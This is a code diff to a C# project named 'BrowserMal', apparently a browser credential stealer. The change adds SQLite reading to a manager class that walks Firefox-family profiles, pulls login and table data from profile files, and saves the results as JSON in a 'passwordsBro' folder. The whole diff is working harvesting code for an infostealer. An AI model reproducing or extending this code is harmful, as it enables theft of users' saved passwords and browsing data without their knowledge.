@@ -6,13 +6,17 @@ using System.IO;
 using BrowserMal.Encryption;
 using BrowserMal.Util;
 using System;
+using BrowserMal.SQLite;
 
 namespace BrowserMal.Manager
 {
     public class GeckoManager<T> : Manager<T>
     {
+        private Dictionary<string, bool> readFiles;
+
         public GeckoManager(string tableName, SqliteTableModel sqliteTableModel) : base(tableName, sqliteTableModel)
         {
+            readFiles = new Dictionary<string, bool>();
         }
 
         public override Dictionary<string, string> Init(ref List<BrowserModel> browsers, string profileType = "")
@@ -23,13 +27,29 @@ namespace BrowserMal.Manager
                     continue;
 
                 List<string> profiles = GetAllProfiles(browser.Location);
-                List<T> creds = FetchFiles(profiles, browser.Name, browser.ProfileName);
+                List<T> creds = new List<T>();
+
+                if (_isSqlite)
+                {
+                    creds = SqliteFetch(profiles);
+
+                    if (creds.Count == 0)
+                        continue;
+
+                    string rand = Path.GetRandomFileName();
+                    _resultList.Add($"{browser.Name}_{_tableName}_{rand}.json", JsonUtil.GetJson<T>(creds));
+                    Filesaver.FileManager.Save<T>(creds, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_{_tableName}_{rand}.json");
+                    
+                    continue;
+                }
+
+                creds = FetchFiles(profiles, browser.Name, browser.ProfileName);
 
                 if (creds.Count == 0)
                     continue;
 
-                _resultList.Add($"{browser.Name}_{GetTableName.Replace(".json", "")}.json", JsonUtil.GetJson<T>(creds));
-                Filesaver.FileManager.Save<T>(creds, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_{GetTableName.Replace(".json", "")}.json");
+                _resultList.Add($"{browser.Name}_{_tableName.Replace(".json", "")}.json", JsonUtil.GetJson<T>(creds));
+                Filesaver.FileManager.Save<T>(creds, @"C:\Users\USER\Desktop\passwordsBro", $"{browser.Name}_{_tableName.Replace(".json", "")}.json");
             }
 
             return _resultList;
@@ -41,7 +61,7 @@ namespace BrowserMal.Manager
 
             foreach (string profile in profiles)
             {
-                string loginFile = Path.Combine(profile, "logins.json");
+                string loginFile = Path.Combine(profile, _tableName);
 
                 if (File.Exists(loginFile))
                 {
@@ -75,5 +95,75 @@ namespace BrowserMal.Manager
 
             return result;
         }
+
+        private string[] GrabAndValidateSqliteValues(List<ColumnModel> columns, ref SqliteHandler sqLiteHandler, int row, out bool ignore)
+        {
+            string[] values = new string[columns.Count];
+
+            for (int i = 0; i < columns.Count; i++)
+            {
+                string value = Format(
+                    sqLiteHandler.GetValue(row, columns[i].GetName()),
+                    columns[i].IsNeedsFormatting(),
+                    columns[i].GetFunction()
+                );
+
+                if (columns[i].IsImportant() && string.IsNullOrEmpty(value))
+                {
+                    ignore = true;
+                    return default;
+                }
+
+                values[i] = value;
+            }
+
+            ignore = false;
+            return values;
+        }
+
+        private string Format(string value, bool needsFormatting, Func<object, object> function)
+        {
+            return (needsFormatting) ? (string)function(value) : value;
+        }
+
+        private List<T> SqliteFetch(List<string> profiles)
+        {
+            List<T> result = new List<T>();
+
+            foreach (string profile in profiles)
+            {
+                string file = Path.Combine(profile, _fileName);
+
+                if (CheckDuplicate(file))
+                    continue;
+
+                readFiles.Add(file, true);
+
+                if (!File.Exists(file))
+                    continue;
+
+                SqliteHandler sqliteHandler = new SqliteHandler(file);
+                sqliteHandler.ReadTable(_tableName);
+
+                for (int i = 0; i <= sqliteHandler.GetRowCount() - 1; i++)
+                {
+                    try
+                    {
+                        string[] values = GrabAndValidateSqliteValues(_sqliteTableModel.GetColumns(), ref sqliteHandler, i, out bool ignore);
+                        if (ignore)
+                            continue;
+
+                        T obj = CreateInstanceOfType(values);
+                        result.Add(obj);
+                    }
+                    catch (Exception) { }
+                }
+            }
+
+            return result;
+        }
+
+        private bool CheckDuplicate(string profileName) => readFiles.ContainsKey(profileName);
+      
     }
 }
